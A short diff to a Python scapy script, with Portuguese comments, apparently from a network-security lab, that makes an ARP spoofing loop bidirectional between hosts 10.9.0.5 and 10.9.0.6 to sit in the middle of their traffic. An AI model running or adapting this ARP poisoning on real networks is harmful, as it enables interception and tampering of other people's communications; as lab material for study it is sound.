@@ -1,6 +1,7 @@
+#!/usr/bin/python3
+
 import scapy.all as scapy
 import subprocess
-import time
 
 # Funcao que pega o endereco MAC local pra enviar no pacote ARP
 def get_localmac():
@@ -22,8 +23,7 @@ def main():
    mac = get_localmac()
    while True:
       spoof(mac, "10.9.0.6", "10.9.0.5")
-      # spoof("02:42:0a:09:00:06", "10.9.0.5", "10.9.0.6")
-      # time.sleep(10)
+      spoof(mac, "10.9.0.5", "10.9.0.6")
    # print(f'Pacote ARP enviado! 10.9.0.5 agora acha que somos o 10.9.0.6!')
 
 if __name__ == "__main__":
